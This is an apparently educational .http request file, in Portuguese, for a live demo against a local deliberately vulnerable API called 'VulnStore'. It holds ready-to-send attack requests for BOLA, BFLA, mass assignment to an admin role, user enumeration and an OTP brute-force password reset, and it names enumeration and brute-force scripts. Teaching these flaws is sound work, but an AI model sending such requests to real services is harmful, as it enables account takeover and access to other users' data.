############################################################################
# VulnStore — requisições cruas da demo
#
# - No VS Code (extensão REST Client) ou JetBrains HTTP Client: clique em
#   "Send Request" acima de cada bloco.
# - Plano B caso o Postman dê problema no dia. A demo principal é pela
#   coleção do Postman (pasta postman/).
# - Troque @base para http://127.0.0.1:3001 para repetir tudo no modo seguro.
############################################################################

@base = http://127.0.0.1:3000
# cole aqui o token devolvido pelo login
@token = COLE_O_TOKEN_AQUI

### 0. Login do atacante (João)
POST {{base}}/api/auth/login
Content-Type: application/json

{"email":"joao@vulnstore.test","password":"joao123"}

### 1. EXCESSIVE DATA EXPOSURE — rota pública de avaliações
GET {{base}}/api/products/1/reviews

### 2. BOLA — meu pedido
GET {{base}}/api/orders/1003
Authorization: Bearer {{token}}

### 2b. BOLA — pedido de outro cliente (só troquei o ID)
#  Em escala: node scripts/enum-orders.js http://127.0.0.1:3000 1000 1010
GET {{base}}/api/orders/1002
Authorization: Bearer {{token}}

### 2c. BOLA em escrita — cancelar o pedido da Ana
POST {{base}}/api/orders/1001/cancel
Authorization: Bearer {{token}}

### 3. BFLA — rota administrativa com token de cliente
GET {{base}}/api/admin/users
Authorization: Bearer {{token}}

### 3b. BFLA — trocar o método: GET -> DELETE
DELETE {{base}}/api/admin/users/5
Authorization: Bearer {{token}}

### 4. MASS ASSIGNMENT — antes: criar cupom dá 403
POST {{base}}/api/admin/coupons
Authorization: Bearer {{token}}
Content-Type: application/json

{"code":"HACK100","discount":100}

### 4b. MASS ASSIGNMENT — adicionar campos que o formulário não tem
PATCH {{base}}/api/users/me
Authorization: Bearer {{token}}
Content-Type: application/json

{"name":"João Silva","role":"admin","credits":99999}

### 4c. MASS ASSIGNMENT — depois: repita a requisição 4 (agora 201)

### 5. RATE LIMITING — enumeração de usuários (compare as mensagens)
POST {{base}}/api/auth/login
Content-Type: application/json

{"email":"maria@vulnstore.test","password":"x"}

### 5b.
POST {{base}}/api/auth/login
Content-Type: application/json

{"email":"bruno@vulnstore.test","password":"x"}

### 5c. Disparar o código de recuperação para a Ana
POST {{base}}/api/auth/forgot-password
Content-Type: application/json

{"email":"ana@vulnstore.test"}

### 5d. Alvo do brute force — no ao vivo use: node scripts/brute-otp.js
POST {{base}}/api/auth/reset-password
Content-Type: application/json

{"email":"ana@vulnstore.test","code":"0000","newPassword":"hackeada123"}

### Reset do laboratório
POST {{base}}/api/__reset
